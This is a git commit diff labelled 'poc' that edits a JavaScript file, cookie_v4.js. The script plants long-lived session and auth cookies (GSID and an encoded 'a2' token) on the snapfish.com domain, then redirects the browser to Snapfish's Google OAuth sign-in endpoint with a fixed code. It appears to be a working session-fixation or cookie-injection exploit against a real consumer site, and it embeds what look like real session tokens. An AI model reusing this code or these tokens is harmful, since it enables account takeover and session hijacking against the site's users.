4b7d8c49a2f0a7dc0c5952eb7f4634f69b4cb3bb
fernando <fernando_bortotti@hotmail.com>
2025-02-14 18:58:01 -0300

    poc

--- cookie_v4.js
+++ cookie_v4.js
@@ -14,6 +14,7 @@ for (let i = 0; i < quantidadeCookies; i++) {
 const expires = new Date();
 expires.setFullYear(expires.getFullYear() + 10);
 
-document.cookie = `GSID=aus-a9043392-8b5a-4902-bee5-2d0630227267-01267; Domain=snapfish.com; Path=/; Expires=${expires.toUTCString()}`;
+document.cookie = `GSID=aus-27e95bb9-7d53-4fb5-92c4-3e5646cc8f53-31160; a2=sf_v1a%3Bdx1Rx3Tjip9bozPu5UiZUUz0vWMdLqYD3YJSWa%2BMAP3BMqjY9NbkMUR46F%2BC1yhbsO2VSiaEB%2BRHE2ItowKvrUKnGfa7ZVhYr1PSKOCudUjzghPlhyGxS0WxoolX4Phjy3yqXDB4GPUzL9JpmETJpQ2En0%2BOHMRMHkN%2FcsO98zM%3DdjsXI10vu04FsHzujt6XxBdAP9%2FQLo%2BAFp5odtDrO4uJpyVJaRsPvEmClWWoPc%2B55sXHOVvM88jnPLtraaRCgrzZToHWYhEQ3PH8Z1AVT8O3lCLt%2B9yJHgiBG1y%2FxKIJ%2B4Q1ZmNjCqEetFw41ovuH7bUuo86%2F2ftPehk1x296Sc%3D; Domain=snapfish.com; Path=/youraccount?tab=tab-1#deals; Expires=${expires.toUTCString()}`;
 
 window.location.href = "https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=484210975577308&SubscriptionFlag=ALL";
+
